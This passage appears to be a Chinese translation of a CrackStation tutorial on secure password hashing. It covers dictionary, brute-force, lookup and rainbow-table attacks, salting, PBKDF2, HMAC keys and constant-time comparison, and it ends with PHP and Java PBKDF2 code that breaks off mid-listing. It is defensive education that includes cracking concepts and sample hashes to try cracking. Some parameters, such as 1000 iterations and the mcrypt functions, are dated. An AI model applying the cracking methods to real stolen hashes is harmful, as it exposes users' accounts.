Trying letmein      : failed
Trying s3cr3t       : success!
字典攻击是将常用的密码，单词，短语和其他可能用来做密码的字符串放到一个文件中，然后对文件中的每一个词进行hash，将这些hash与需要破解的密码hash比较。这种方式的成功率取决于密码字典的大小以及字典的是否合适。

Brute Force Attack

Trying aaaa : failed
Trying aaab : failed
Trying aaac : failed
...
Trying acdb : failed
Trying acdc : success!
暴力攻击就是对于给定的密码长度，尝试每一种可能的字符组合。这种方式需要花费大量的计算机时间。但是理论上只要时间足够，最后密码一定能够破解出来。只是如果密码太长，破解花费的时间就会大到无法承受。

目前没有方式可以阻止字典攻击和暴力攻击。只能想办法让它们变的低效。如果你的密码hash系统设计的是安全的，那么破解hash唯一的方式就是进行字典或者暴力攻击了。

查表破解(Lookup Tables)
对于特定的hash类型，如果需要破解大量hash的话，查表是一种非常有效而且快速的方式。它的理念就是预先计算(pre-compute)出密码字典中每一个密码的hash。然后把hash和对应的密码保存在一个表里。一个设计良好的查询表结构，即使存储了数十亿个hash，每秒钟仍然可以查询成百上千个hash。

如果你想感受下查表破解hash的话可以尝试一下在CraskStation上破解下下面的sha256 hash。

c11083b4b0a7743af748c85d343dfee9fbb8b2576c05f3a7f0d632b0926aadfc
08eac03b80adc33dc7d8fbe44b7c7b05d3a2c511166bdb43fcb710b03ba919e7
e4ba5cbd251c98e6cd1c23f126a3b81d8d8328abc95387229850952b3ef9f904
5206b8b8a996cf5320cb12ca91c7b790fba9f030408efe83ebb83548dc3007bd
反向查表破解(Reverse Lookup Tables)
Searching for hash(apple) in users' hash list...     : Matches [alice3, 0bob0, charles8]
Searching for hash(blueberry) in users' hash list... : Matches [usr10101, timmy, john91]
Searching for hash(letmein) in users' hash list...   : Matches [wilson10, dragonslayerX, joe1984]
Searching for hash(s3cr3t) in users' hash list...    : Matches [bruce19, knuth1337, john87]
Searching for hash(z@29hjja) in users' hash list...  : No users used this password
这种方式可以让攻击者不预先计算一个查询表的情况下同时对大量hash进行字典和暴力破解攻击。

首先，攻击者会根据获取到的数据库数据制作一个用户名和对应的hash表。然后将常见的字典密码进行hash之后，跟这个表的hash进行对比，就可以知道用哪些用户使用了这个密码。这种攻击方式很有效果，因为通常情况下很多用户都会有使用相同的密码。

彩虹表 (Rainbow Tables)
彩虹表是一种使用空间换取时间的技术。跟查表破解很相似。只是它牺牲了一些破解时间来达到更小的存储空间的目的。因为彩虹表使用的存储空间更小，所以单位空间就可以存储更多的hash。彩虹表已经能够破解8位长度的任意md5hash。彩虹表具体的原理可以参考http://www.project-rainbowcrack.com/

下一章节我们会讨论一种叫做“盐”(salting)的技术。通过这种技术可以让查表和彩虹表的方式无法破解hash。

加盐(Adding Salt)
hash("hello")                    = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
hash("hello" + "QxLUF1bgIAdeQX") = 9e209040c863f84a31e719795b2577523954739fe5ed3b58a75cff2127075ed1
hash("hello" + "bv5PehSMfV11Cd") = d1d3ec2e6f20fd420d50e2642992841d8338a314b8ea157c9e18477aaef226ab
hash("hello" + "YYLmfY6IehjZMQ") = a49670c3c18b9e079b9cfaf51634f563dc8ae3070db2c4a8544305df1b60f007
查表和彩虹表的方式之所以有效是因为每一个密码的都是通过同样的方式来进行hash的。如果两个用户使用了同样的密码，那么一定他们的密码hash也一定相同。我们可以通过让每一个hash随机化，同一个密码hash两次，得到的不同的hash来避免这种攻击。

具体的操作就是给密码加一个随即的前缀或者后缀，然后再进行hash。这个随即的后缀或者前缀成为“盐”。正如上面给出的例子一样，通过加盐，相同的密码每次hash都是完全不一样的字符串了。检查用户输入的密码是否正确的时候，我们也还需要这个盐，所以盐一般都是跟hash一起保存在数据库里，或者作为hash字符串的一部分。

盐不需要保密，只要盐是随机的话，查表，彩虹表都会失效。因为攻击者无法事先知道盐是什么，也就没有办法预先计算出查询表和彩虹表。如果每个用户都是使用了不同的盐，那么反向查表攻击也没法成功。

下一节，我们会介绍一些盐的常见的错误实现。

错误的方式：短的盐和盐的复用
最常见的错误实现就是一个盐在多个hash中使用或者使用的盐很短。

盐的复用(Salt Reuse)
不管是将盐硬编码在程序里还是随机一次生成的，在每一个密码hash里使用相同的盐会使这种防御方法失效。因为相同的密码hash两次得到的结果还是相同的。攻击者就可以使用反向查表的方式进行字典和暴力攻击。只要在对字典中每一个密码进行hash之前加上这个固定的盐就可以了。如果是流行的程序的使用了硬编码的盐，那么也可能出现针对这种程序的这个盐的查询表和彩虹表，从而实现快速破解hash。

用户每次创建或者修改密码一定要使用一个新的随机的盐

短的盐
如果盐的位数太短的话，攻击者也可以预先制作针对所有可能的盐的查询表。比如，3位ASCII字符的盐，一共有95x95x95 = 857,375种可能性。看起来好像很多。假如每一个盐制作一个1MB的包含常见密码的查询表，857,375个盐才是837GB。现在买个1TB的硬盘都只要几百块而已。

基于同样的理由，千万不要用用户名做为盐。虽然对于每一个用户来说用户名可能是不同的，但是用户名是可预测的，并不是完全随机的。攻击者完全可以用常见的用户名作为盐来制作查询表和彩虹表破解hash。

根据一些经验得出来的规则就是盐的大小要跟hash函数的输出一致。比如，SHA256的输出是256bits(32bytes),盐的长度也应该是32个字节的随机数据。

错误的方式：双重hash和古怪的hash函数
这一节讨论另外一个常见的hash密码的误解:古怪的hash算法组合。人们可能解决的将不同的hash函数组合在一起用可以让数据更安全。但实际上，这种方式带来的效果很微小。反而可能带来一些互通性的问题，甚至有时候会让hash更加的不安全。本文一开始就提到过，永远不要尝试自己写hash算法，要使用专家们设计的标准算法。有些人会觉得通过使用多个hash函数可以降低计算hash的速度，从而增加破解的难度。通过减慢hash计算速度来防御攻击有更好的方法，这个下文会详细介绍。

下面是一些网上找到的古怪的hash函数组合的样例。

md5(sha1(password))
md5(md5(salt) + md5(password))
sha1(sha1(password))
sha1(str_rot13(password + salt))
md5(sha1(md5(md5(password) + sha1(password)) + md5(password)))
不要使用他们！

注意：这部分的内容其实是存在争议的！我收到过大量邮件说组合hash函数是有意义的。因为如果攻击者不知道我们用了哪个函数，就不可能事先计算出彩虹表，并且组合hash函数需要更多的计算时间。

攻击者如果不知道hash算法的话自然是无法破解hash的。但是考虑到Kerckhoffs’s principle,攻击者通常都是能够接触到源码的(尤其是免费软件和开源软件)。通过一些目标系统的密码–hash对应关系来逆向出算法也不是非常困难。

如果你想使用一个标准的”古怪”的hash函数，比如HMAC，是可以的。但是如果你的目的是想减慢hash的计算速度，那么可以读一下后面讨论的慢速hash函数部分。基于上面讨论的因素，最好的做法是使用标准的经过严格测试的hash算法。

hash碰撞(Hash Collisions)
因为hash函数是将任意数量的数据映射成一个固定长度的字符串，所以一定存在不同的输入经过hash之后变成相同的字符串的情况。加密hash函数(Cryptographic hash function)在设计的时候希望使这种碰撞攻击实现起来成本难以置信的高。但时不时的就有密码学家发现快速实现hash碰撞的方法。最近的一个例子就是MD5，它的碰撞攻击已经实现了。

碰撞攻击是找到另外一个跟原密码不一样，但是具有相同hash的字符串。但是，即使在相对弱的hash算法，比如MD5,要实现碰撞攻击也需要大量的算力(computing power),所以在实际使用中偶然出现hash碰撞的情况几乎不太可能。一个使用加盐MD5的密码hash在实际使用中跟使用其他算法比如SHA256一样安全。不过如果可以的话，使用更安全的hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL等是更好的选择。

正确的方式：如何恰当的进行hash
这部分会详细讨论如何恰当的进行密码hash。第一个章节是最基础的，这章节的内容是必须的。后面一个章节是阐述如何继续增强安全性，让hash破解变得异常困难。

基础：使用加盐hash
我们已经知道恶意黑客可以通过查表和彩虹表的方式快速的获得hash对应的明文密码，我们也知道了通过使用随机的盐可以解决这个问题。但是我们怎么生成盐，怎么在hash的过程中使用盐呢？

盐要使用密码学上可靠安全的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator (CSPRNG))来产生。CSPRNG跟普通的伪随机数生成器比如C语言中的rand(),有很大不同。正如它的名字说明的那样，CSPRNG提供一个高标准的随机数，是完全无法预测的。我们不希望我们的盐能够被预测到，所以一定要使用CSPRNG。下表提供了一些常用语言中的CSPRNG。

Platform	CSPRNG
PHP	mcrypt_create_iv, openssl_random_pseudo_bytes
Java	java.security.SecureRandom
Dot NET (C#, VB)	System.Security.Cryptography.RNGCryptoServiceProvider
Ruby	SecureRandom
Python	os.urandom
Perl	Math::Random::Secure
C/C++ (Windows API)	CryptGenRandom
Any language on GNU/Linux or Unix	Read from /dev/random or /dev/urandom
每一个用户，每一个密码都要使用不同的盐。用户每次创建账户或者修改密码都要使用一个新的随机盐。永远不要重复使用盐。盐的长度要足够，一个经验规则就是盐的至少要跟hash函数输出的长度一致。盐应该跟hash一起存储在用户信息表里。

存储一个密码：

1, 使用CSPRNG生成一个长的随机盐。 

2, 将密码和盐拼接在一起，使用标准的加密hash函数比如SHA256进行hash 

3, 将盐和hash记录在用户数据库中

验证一个密码：

1, 从数据库中取出用户的盐和hash 

2, 将用户输入的密码和盐按相同方式拼接在一起，使用相同的hash函数进行hash 

3, 比较计算出的hash跟存储的hash是否相同。如果相同则密码正确。反之则密码错误。

在本文的最后，给出了php,C#,Java,Ruby的加盐密码hash的实现代码。

在web应用中，要在服务端进行hash：

如果你在写一个web应用，可能会有在客户端还是服务端进行hash的疑惑。是将密码在浏览器里使用javascript进行hash，还是将明文传给服务端，在服务端进行hash呢？

即使在客户端用javascript进行了hash，在服务端依然需要将得到的密码hash再进行hash。如果不这么做的话，认证用户的时候，服务端是获取了浏览器传过来的hash跟数据库里的hash比较。这样子看起来是更安全了，因为没有明文密码传送到服务端。但是事实上却不是这样。

问题在于这样的话，如果恶意的黑客获取了用户的hash，就可以直接用来登陆用户的账号了。甚至都不需要知道用户的明文密码！也就不需要破解hash了。

这并不是说你完全不能在浏览器端进行hash。只是如果你要这样做的话，一定要在服务端再hash一次。在浏览器端进行hash是一个不错的想法，但是在实现的时候一定要考虑到以下几点：

1, 客户端密码hash并不是HTTPS(SSL/TLS)的替代品。如果浏览器和服务器之间的连接是不安全的，中间人(man-in-the-middle)可能通过修改网页的加载的javascript移除掉hash函数来得到用户的明文密码。

2, 有些浏览器可能不支持javascript，有些用户也会禁用javascript。为了更好的兼容性，需要检测用户的浏览器是否支持javascript，如果不支持的话就需要在服务端模拟客户端hash的逻辑。

3, 客户端的hash也需要加盐。一个很容想到的方式就是使用客户端脚本请求服务器或得用户的盐。记住，不要使用这种方式。因为这样恶意攻击者就可以通过这个逻辑来判断一个用户名是否有效。因为我们已经在服务端进行了恰当的加盐的hash。所以这里使用用户名跟特定的字符串(比如域名)拼接作为客户端的盐是可以的。

使用慢速hash函数让破解更加困难:

加盐可以让攻击者无法使用查表和彩虹表的方式对大量hash进行破解。但是依然无法避免对单个hash的字典和暴力攻击。高端的显卡(GPUs)和一些定制的硬件每秒可以计算数十亿的hash，所以针对单个hash的攻击依然有效。为了避免字典和暴力攻击，我们可以采用一种称为key扩展(key stretching)的技术。

思路就是让hash的过程便得非常缓慢，即使使用高速GPU和特定的硬件，字典和暴力破解的速度也慢到没有实用价值。通过减慢hash的过程来防御攻击，但是hash速度依然可以保证用户使用的时候没有明显的延迟。

key扩展的实现是使用一种大量消耗cpu资源的hash函数。不要去使用自己创造的迭代hash函数，那是不够的。要使用标准算法的hash函数，比如PBKDF2或者bcrypt。PHP实现可以在这里找到。

这些算法采用了一个安全变量或者迭代次数作为参数。这个值决定了hash的过程具体有多慢。对于桌面软件和手机APP，确定这个参数的最好方式是在设备上运行一个标准测试程序得到hash时间大概在半秒左右的值。这样就可以避免暴力攻击，也不会影响用户体验。

如果是在web应用中使用key扩展hash函数，需要考虑可能有大量的计算资源用来处理用户认证请求。攻击者可能通过这种方式来进行拒绝服务攻击。不过我依然推荐使用key扩展hash函数，只是迭代次数设置的小一点。这个次数需要根据自己服务器的计算能力和预计每秒需要处理的认证请求次数来设置。对于拒绝服务攻击可以通过让用户登陆的时候输入验证码的方式来防御。系统设计的时候一定要考虑到这个迭代次数将来可以方便的增加或降低。

如果你担心计算机的能力不够强，而又希望在自己的web应用中使用key扩展hash函数，可以考虑在用户的浏览器运行hash函数。Stanford JavaScript Crypto Library包含了PBKDF2算法。在浏览器中进行hash需要考虑上面提到的几个方面。

理论上不可能破解的hash：使用加密的key和密码hash硬件

只要攻击者能够验证一个猜测的密码是正确还是错误，他们都可以使用字典或者暴力攻击破解hash。更深度的防御方法是加入一个保密的key(secret key)进行hash，这样只有知道这个key的人才能验证密码是否正确。这个可以通过两种方式来实现。一种是hash通过加密算法加密比如AES，或者使用基于key的hash函数(HMAC)。

这个实现起来并不容易。key一定要做到保密，即使系统被攻破也不能泄露才行。但是如果攻击者获取了系统权限，无论key保存在哪里，都可能被获取到。所以这个key一定要保存在一个外部系统中，比如专门用来进行密码验证的物理隔离的服务器。或是使用安装在服务器上特殊硬件，比如YubiHSM。

强烈建议所有大型的服务(超过10万用户)的公司使用这种方式。对于超过100万用户的服务商一定得采用这种方式保护用户信息。

如果条件不允许使用专用验证的服务器和特殊的硬件，依然从这种方式中受益。大部分数据库泄露都是利用了SQL注入技术。sql注入大部分情况下，攻击者都没法读取服务器上的任意文件(关闭数据库服务器的文件权限)。如果你生成了一个随机的key，把它保存在了一个文件里。并且密码使用了加密key的加盐hash，单单sql注入攻击导致的hash泄露并不会影响用户的密码。虽然这种方式不如使用独立的系统来保存key安全，因为如果系统存在文件包含漏洞的话，攻击者就可能读取这个秘密文件了。不过，使用了加密key总归好过没有使用吧。

需要注意使用key的hash并不是不需要加盐，聪明的攻击者总是会找到办法获取到key的。所以让hash在盐和key扩展的保护下非常重要。

其他的安全措施
密码hash仅仅是在发生安全事故的时候保护密码。它并不能让应用程序更加安全。对于保护用户密码hash更多的是需要保护密码hash不被偷走。

即使经验丰富的程序也需要经过安全培训才能写出安全的应用。一个不错的学习web应用漏洞的资源是OWASP。除非你理解了OWASP Top Ten Vulnerability List,否则不要去写关系到敏感数据的程序。公司有责任确保所有的开发者都经过了足够的安全开发的培训。

通过第三方的渗透测试也是不错的方式。即使最好的程序员也会犯错，所以让安全专家来审计代码总是有意义的。寻找一个可信赖的第三方或者自己招聘一个安全人员来机型定期的代码审计。安全评审要在应用生命周期的早期就开始并且贯穿整个开发过程。

对网站进行入侵监控也十分重要。我建议至少招聘一名全职的安全人员进行入侵检测和安全事件响应。如果入侵没有检测到，攻击者可能让在你的网站上挂马影响你的用户。所以迅速的入侵检测和响应也很重要。

经常提问的问题
我应该使用什么hash算法

可以使用

1, 本文最后介绍的代码 

2, OpenWall的Portable PHP password hashing framework 

3, 经过充分测试的加密hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL, SHA3等 

4, 设计良好的key扩展hash算法，比如PBKDF2，bcrypt，scrypt 

5, crypt#Library_Function_crypt.283.29)的安全版本。($2y$, $5$, $6$)

不要使用

1, 过时的hash函数，比如MD5,SHA1 

2， crypt的不安全版本。($1$, $2$, $2x$, $3$) 

3, 任何自己设计的算法。

尽管MD5和SHA1并没有密码学方面的攻击导致它们生成的hash很容易被破解，但是它们年代很古老了，通常都认为(可能有一些不恰当)它们不合适用来进行密码的存储。所以我不推荐使用它们。对于这个规则有个例外就是PBKDF2,它使用SHA1作为它的基础算法。

当用户忘记密码的时候我应该怎样让他们重置

在我个人看来现在外面广泛使用的密码重置机制都是不安全的，如果你有很高的安全需求，比如重要的加密服务，那么不要让用户重置他们的密码。

大多数网站使用绑定的email来进行密码找回。通过生成一个随机的只使用一次的token，这个token必须跟账户绑定，然后把密码重置的链接发送到用户邮箱中。当用户点击密码重置链接的时候，提示他们输入新的密码。需要注意token一定要绑定到用户以免攻击者使用发送给自己的token来修改别人的密码。

token一定要设置成15分钟后或者使用一次后作废。当用户登陆或者请求了一个新的token的时候，之前发送的token都作废也是不错的主意。如果token不失效的话，那么就可以用来永久控制这个账户了。Email(SMTP)是明文传输的协议，而互联网上可能有很多恶意的路由器记录email流量。并且用户的email账号也可能被盗。使token尽可能快的失效可以降低上面提到的这些风险。

用户可能尝试去修改token，所以不要在token里存储任何账户信息。token应该是一个不能被预测的随机的二进制块(binary blob)，仅仅用来进行识别的一条记录。

永远不要通过email发送用户的新密码。记得用户重置密码的时候要重新生成盐，不要使用之前旧密码使用的盐。

如果我的用户数据库泄露了，我应该怎么办

第一要做的就是弄明白信息是怎么泄露的，然后把漏洞修补好。

人们可能会想办法掩盖这次安全事件，希望没有人知道。但是，尝试掩盖安全事件会让你的处境变得更糟。因为你不告知你的用户他的信息和密码可能泄露了会给用户带来更大的风险。一定要第一时间通知用户发生了安全事件，即使你还没有完全搞明白黑客到底渗透到了什么程度。在首页上放一个提醒，然后链接到详细说明的页面。如果可能的话给每一个用户发送email提醒。

向你的用户详细的说明他的密码是如何被保护的，希望是加盐的hash，即使密码进行了加盐hash保护，攻击者依然会进行字典和暴力攻击尝试破解hash。攻击者会使用发现的密码尝试登陆其他网站，因为用户可能在不同的网站都使用了相同的密码(所谓的撞库攻击)。告知你的用户存在的这些风险，建议他们修改使用了相同密码的地方。在自己的网站上，下次用户登陆的时候强制他们修改密码。大部分用户可能会尝试使用相同的密码，为了方便。要设计足够的逻辑避免这样的情况发生。

即使有了加盐的hash，攻击者也可能快速破解一些很弱的弱密码。为了降低这种风险，可以在使用正确密码的前提下，加一个邮件认证，直到用户修改密码。

还要告知你的用户有哪些个人信息存储在网站上。如果数据库包含信用卡信息，你需要通知你的用户注意自己近期的账单，并且最好注销掉这个信用卡。

应该使用怎样的密码策略，需要强制使用强密码么

如果你的服务不是有很严格的安全需求，那么不要限制你的用户。我建议在用户输入密码的时候显示它的强度等级。让用户自己决定使用什么强度的密码。如果你的系统有很强的安全需求，那么强制用户使用12位以上的密码，至少包含2个数字，2个字母，2个字符。

每6个月最多强制用户修改一次密码。超过这个次数，用户就会感到疲劳。他们更倾向于选择一个弱密码。更应该做的是教育你的用户，当他们感到自己的密码可能泄露的时候主动修改密码。

如果攻击者获取了数据库权限，他不能直接替换hash登陆任意账户么

当然，不过如果他已经或得了数据库权限，很可能已经可以获得服务器上的所有信息了。所以没有什么必要去修改hash登陆别人账户。进行密码hash的目的不是保护网站不被入侵，而是如果入侵发生了，可以更好的保护用户的密码。

在SQL注入攻击中，保护hash不被替换的方式使用两个用户不同权限的用户连接数据库。一个具有写权限，另外一个只具有只读的权限。

为什么需要一些特别的算法比如HMAC，而不是直接把密码和加密key拼接在一起

(这部分讲一些密码学的原理，翻译的不好请见谅)

hash函数，比如MD5,SHA1,SHA2使用了Merkle–Damgård construction，这导致算法可能长度扩展攻击(length extension attacks)。意思就是说给定一个hash H(X)，攻击者可以在不知道X的情况下，可以找到一个H(pad(X)+Y)的值，Y是个其他的字符串。pad(X)是hash函数使用的填充函数(padding function)。

这就意味者，对于hash H(key + message)，攻击者可以计算 H(pad(key + message) + extension)，并不需要知道加密key。如果这个hash是用在消息认证过程中，使用key为了避免消息被修改。这样的话这个系统就可能失效了，因为攻击者掌握了一个有效的基于 message+extension的hash。

这种攻击对于如何快速破解hash还不是很清楚。但是，基于一些风险的考虑，不建议使用单纯的hash函数进行加密key的hash。也许一个聪明的密码学家一天就可以找到使用这种攻击快速破解hash的方法。所以记得使用HMAC。

盐应该拼在密码的前面还是后面

这个不重要。选择一个并且保持风格一致就行了。实际中，把盐放在前面更常见一点。

为什么本文最后提供的hash代码使用了固定执行时间的函数来比较hash(length-constant)

使用固定的时间来比较hash是为了防止攻击者在线上的系统中使用基于时间差的攻击。这样攻击者就只能线下破解了。

比较两个字符串是否相同，标准的方式是先比较第一个字节，然后比较第二个字节，一次类推。只要发现有一个字节不同，那么这两个字符串就是不同了。可以返回false的消息了。如果所有字节比较下来都一样，那么这两个字符串就是相同的，可以返回true。这就意味了比较两个字符串，如果他们相同的长度不一样，花费的时间不一样。开始部分相同的长度越长，花费的时间也就越长。

基于这个原理，攻击者可以先找256个字符串，他们的hash都是以不同的字节开头。然后发送到目标服务器，计算服务器返回的时间。时间最长的那一个就是第一个字节hash是正确的。依次类推。攻击者就可能得到hash更多的字节。

这种攻击听起来好像在网络上实现起来比较困难。但是已经有人实现过了。所以我们在比较hash的时候采用了花费时间固定的函数。

本文提供的代码中 slowequals 函数是怎么工作的

上一回答讲到了我们需要比较时间固定的函数，这部分详细讲一下代码的实现。

1.     private static boolean slowEquals(byte[] a, byte[] b)
2.     {
3.         int diff = a.length ^ b.length;
4.         for(int i = 0; i < a.length && i < b.length; i++)
5.             diff |= a[i] ^ b[i];
6.         return diff == 0;
7.     }
这段代码使用了异或(XOR)操作符”^”来比较整数是否相等，而没有使用”==”操作符。原因在于如果两个数完全一致，异或之后的值为零。因为 0 XOR 0 = 0, 1 XOR 1 = 0, 0 XOR 1 = 1, 1 XOR 0 = 1。

所以，第一行代码如果a.length等于b.length，变量diff等于0,否则的话diff就是一个非零的值。然后，让a，b的每一个字节XOR之后再跟diff OR。这样，只有diff一开始是0,并且，a，b的每一个字节XOR的结果也是零，最后循环完成后diff的值才是0,这种情况是a，b完全一样。否则最后diff是一个非零的值。

我们使用XOR而不适用”==”的原因是”==”通常编译成分支的形式。比如C代码”diff &= a == b” 可能编译成下面的X86汇编。

MOV EAX, [A]
CMP [B], EAX
JZ equal
JMP done
equal:
AND [VALID], 1
done:
AND [VALID], 0
分支会导致代码执行的时间出现差异。

C代码的”diff |= a ^ b”编译之后类似于，

MOV EAX, [A]
XOR EAX, [B]
OR [DIFF], EAX
执行时间跟两个变量是否相等没有关系。

为什么要讨论这么多关于hash的东西

用户在你的网站上输入密码，是相信你的安全性。如果你的数据库被黑了。而用户密码又没有恰当的保护，那么恶意的攻击者就可以利用这些密码尝试登陆其他的网站和服务。进行撞库攻击。(很多用户在所有的地方都是使用相同的密码)这不仅仅是你的网站安全，是你的所有用户的安全。你要对你用户的安全负责。

PHP PBKDF2 密码hash代码
代码下载

<?php
/*
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */// These constants may be changed without breaking existing hashes.
define("PBKDF2_HASH_ALGORITHM", "sha256");
define("PBKDF2_ITERATIONS", 1000);
define("PBKDF2_SALT_BYTE_SIZE", 24);
define("PBKDF2_HASH_BYTE_SIZE", 24);
define("HASH_SECTIONS", 4);
define("HASH_ALGORITHM_INDEX", 0);
define("HASH_ITERATION_INDEX", 1);
define("HASH_SALT_INDEX", 2);
define("HASH_PBKDF2_INDEX", 3);function create_hash($password){
    // format: algorithm:iterations:salt:hash
    $salt = base64_encode(mcrypt_create_iv(PBKDF2_SALT_BYTE_SIZE, MCRYPT_DEV_URANDOM));
    return PBKDF2_HASH_ALGORITHM . ":" . PBKDF2_ITERATIONS . ":" .  $salt . ":" .
        base64_encode(pbkdf2(
            PBKDF2_HASH_ALGORITHM,
            $password,
            $salt,
            PBKDF2_ITERATIONS,
            PBKDF2_HASH_BYTE_SIZE,
            true
        ));}function validate_password($password, $correct_hash){
    $params = explode(":", $correct_hash);
    if(count($params) < HASH_SECTIONS)
       return false;
    $pbkdf2 = base64_decode($params[HASH_PBKDF2_INDEX]);
    return slow_equals(
        $pbkdf2,
        pbkdf2(
            $params[HASH_ALGORITHM_INDEX],
            $password,
            $params[HASH_SALT_INDEX],
            (int)$params[HASH_ITERATION_INDEX],
            strlen($pbkdf2),
            true
        )
    );}// Compares two strings $a and $b in length-constant time.function slow_equals($a, $b){
    $diff = strlen($a) ^ strlen($b);
    for($i = 0; $i < strlen($a) && $i < strlen($b); $i++)
    {
        $diff |= ord($a[$i]) ^ ord($b[$i]);
    }
    return $diff === 0;}/*
 * PBKDF2 key derivation function as defined by RSA's PKCS #5: https://www.ietf.org/rfc/rfc2898.txt
 * $algorithm - The hash algorithm to use. Recommended: SHA256
 * $password - The password.
 * $salt - A salt that is unique to the password.
 * $count - Iteration count. Higher is better, but slower. Recommended: At least 1000.
 * $key_length - The length of the derived key in bytes.
 * $raw_output - If true, the key is returned in raw binary format. Hex encoded otherwise.
 * Returns: A $key_length-byte key derived from the password and salt.
 *
 * Test vectors can be found here: https://www.ietf.org/rfc/rfc6070.txt
 *
 * This implementation of PBKDF2 was originally created by https://defuse.ca
 * With improvements by http://www.variations-of-shadow.com
 */function pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output = false){
    $algorithm = strtolower($algorithm);
    if(!in_array($algorithm, hash_algos(), true))
        trigger_error('PBKDF2 ERROR: Invalid hash algorithm.', E_USER_ERROR);
    if($count <= 0 || $key_length <= 0)
        trigger_error('PBKDF2 ERROR: Invalid parameters.', E_USER_ERROR);
    if (function_exists("hash_pbkdf2")) {
        // The output length is in NIBBLES (4-bits) if $raw_output is false!
        if (!$raw_output) {
            $key_length = $key_length * 2;
        }
        return hash_pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output);
    }
    $hash_length = strlen(hash($algorithm, "", true));
    $block_count = ceil($key_length / $hash_length);
    $output = "";
    for($i = 1; $i <= $block_count; $i++) {
        // $i encoded as 4 bytes, big endian.
        $last = $salt . pack("N", $i);
        // first iteration
        $last = $xorsum = hash_hmac($algorithm, $last, $password, true);
        // perform the other $count - 1 iterations
        for ($j = 1; $j < $count; $j++) {
            $xorsum ^= ($last = hash_hmac($algorithm, $last, $password, true));
        }
        $output .= $xorsum;
    }
    if($raw_output)
        return substr($output, 0, $key_length);
    else
        return bin2hex(substr($output, 0, $key_length));}?>
java PBKDF2 密码hash代码
代码下载

/* 
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */

import java.security.SecureRandom;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.SecretKeyFactory;
import java.math.BigInteger;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;

/*
 * PBKDF2 salted password hashing.
 * Author: havoc AT defuse.ca
 * www: http://crackstation.net/hashing-security.htm
 */
public class PasswordHash
{
    public static final String PBKDF2_ALGORITHM = "PBKDF2WithHmacSHA1";

    // The following constants may be changed without breaking existing hashes.
    public static final int SALT_BYTE_SIZE = 24;
    public static final int HASH_BYTE_SIZE = 24;
    public static final int PBKDF2_ITERATIONS = 1000;

    public static final int ITERATION_INDEX = 0;
    public static final int SALT_INDEX = 1;
    public static final int PBKDF2_INDEX = 2;

    /**
     * Returns a salted PBKDF2 hash of the password.
     *
     * @param   password    the password to hash
     * @return              a salted PBKDF2 hash of the password
     */
    public static String createHash(String password)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        return createHash(password.toCharArray());
    }

    /**
     * Returns a salted PBKDF2 hash of the password.
     *
     * @param   password    the password to hash
     * @return              a salted PBKDF2 hash of the password
     */
    public static String createHash(char[] password)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        // Generate a random salt
        SecureRandom random = new SecureRandom();
        byte[] salt = new byte[SALT_BYTE_SIZE];
